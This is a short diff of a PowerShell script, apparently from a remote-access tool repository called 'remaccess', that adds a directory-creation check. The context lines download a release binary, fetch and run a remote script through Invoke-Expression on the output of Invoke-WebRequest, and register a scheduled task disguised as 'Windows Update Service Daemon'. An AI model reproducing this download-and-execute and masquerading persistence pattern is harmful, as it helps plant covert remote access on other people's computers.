@@ -4,6 +4,9 @@ $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/Di
 $pingdaemontask = "Windows Update Service Daemon"
 $urlfortc = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1"
 Invoke-Expression (Invoke-WebRequest -Uri $urlfortc -UseBasicParsing).Content
+if (-not (Test-Path (Split-Path $localFilePath))) {
+    New-Item -Path (Split-Path $localFilePath) -ItemType Directory -Force | Out-Null
+}
 if (Test-Path -Path $localFilePath -PathType Leaf) {
     Remove-Item -Path $localFilePath -Force
 } try {
